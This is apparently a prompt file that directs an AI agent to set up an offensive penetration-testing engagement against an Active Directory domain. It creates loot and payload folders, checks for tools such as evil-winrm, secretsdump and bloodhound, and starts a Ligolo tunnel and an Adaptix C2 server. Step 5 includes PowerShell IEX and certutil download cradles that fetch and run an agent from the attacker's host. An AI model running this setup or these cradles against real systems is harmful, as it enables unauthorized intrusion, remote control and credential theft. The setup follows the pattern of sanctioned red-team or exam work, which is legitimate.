Initialize the OSAI engagement. $ARGUMENTS = scope flags: --domain <domain> --dc <DC_IP> --scope <CIDR1,CIDR2,...>

Example: --domain corp.local --dc 10.10.10.1 --scope 10.10.10.0/24,10.10.20.0/24

## Step 1: Create engagement directory structure
```bash
mkdir -p ~/osai/{recon,loot,payloads,screenshots,state,www}
echo '[]' > ~/osai/state/creds.json
touch ~/osai/state/network_map.md ~/osai/state/tunnel_map.md ~/osai/state/progress.md

cat > ~/osai/state/scope.md << EOF
# Engagement Scope
**Domain:** <DOMAIN from $ARGUMENTS>
**DC:** <DC_IP from $ARGUMENTS>
**Subnets:** <SCOPE from $ARGUMENTS>
**Started:** $(date -u +%Y-%m-%dT%H:%M:%SZ)
EOF
```

## Step 2: Detect Kali IP
```bash
KALI_IP=$(ip route get 1 2>/dev/null | awk '{print $7; exit}')
echo "Kali IP: $KALI_IP"
```

## Step 3: Verify arsenal
```bash
# Check Ligolo agents
ls ~/arsenal/payloads/ligolo/ 2>/dev/null || echo "[!] MISSING: Ligolo agents at ~/arsenal/payloads/ligolo/"
ls ~/arsenal/payloads/winpeas.exe 2>/dev/null || echo "[!] MISSING: winpeas.exe"
ls ~/arsenal/payloads/linpeas.sh 2>/dev/null || echo "[!] MISSING: linpeas.sh"

# Check key tools
which ligolo-proxy || echo "[!] MISSING: ligolo-proxy"
which evil-winrm || echo "[!] MISSING: evil-winrm"
which impacket-secretsdump || echo "[!] MISSING: impacket"
which crackmapexec netexec 2>/dev/null || echo "[!] MISSING: crackmapexec/netexec"
which bloodhound-python || echo "[!] MISSING: bloodhound-python"
```

## Step 4: Ligolo-ng setup instructions
```
=== LIGOLO RELAY (run in tmux pane named 'ligolo') ===
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601

After agent connects:
  ligolo-ng>> session     (select agent)
  ligolo-ng>> start       (activate tun0)

Route commands for scope (run AFTER tunnel active):
```
For each subnet in $ARGUMENTS --scope, print:
```bash
sudo ip route add <SUBNET> dev ligolo
```

## Step 5: Adaptix C2 prep
```
=== ADAPTIX C2 ===
[Note: Integrate Adaptix MCP tool calls here when MCP is available]

Manual setup:
  1. Start Adaptix server
  2. Create HTTP/S listener on port 80 or 443
  3. Generate Windows x64 agent
  4. Place agent in ~/osai/www/
  5. Serve: python3 -m http.server 8000 --directory ~/osai/www/

Agent download from target:
  PowerShell: IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP:8000/agent.ps1')
  certutil:   certutil -urlcache -split -f http://KALI_IP:8000/agent.exe C:\Windows\Temp\agent.exe
```

## Step 6: Print engagement dashboard
```
╔══════════════════════════════════════════╗
║         OSAI ENGAGEMENT READY           ║
╠══════════════════════════════════════════╣
║ Domain:  <DOMAIN>                       ║
║ DC:      <DC_IP>                        ║
║ Scope:   <SCOPE>                        ║
║ Kali:    <KALI_IP>                      ║
╠══════════════════════════════════════════╣
║ ~/osai/recon/     scan output           ║
║ ~/osai/loot/      creds, flags, finds   ║
║ ~/osai/www/       HTTP serve root       ║
║ ~/osai/state/     running state         ║
╚══════════════════════════════════════════╝

NEXT STEPS:
  1. /osai-parallel-recon <all IPs>   → initial sweep
  2. /osai-ai-hunter <web hosts>      → AI surface
  3. Start Ligolo relay in tmux
  4. Start Adaptix server
  5. Screenshot targets: flameshot gui
```
